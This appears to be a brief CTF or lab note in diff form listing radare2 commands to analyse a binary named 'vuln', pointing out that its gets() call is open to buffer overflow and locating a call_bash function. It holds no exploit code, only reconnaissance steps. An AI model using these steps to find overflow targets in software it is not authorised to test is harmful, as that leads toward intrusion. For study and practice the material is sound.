+ (ELF 64-bit not stripped)
+//radare2 -d vuln
+//to see help taper
+?
+aaa
+afl :// to display all the functions of the binary 
+//as we can see we have  gets function it is vulnerable to buffer overfow
+//if we need work with the function par exemple 
+sym.call_bash
+//tapper
+s sym.call_bash
+pdf
+
+
+
+
+
+
+
+
+
+
+
+
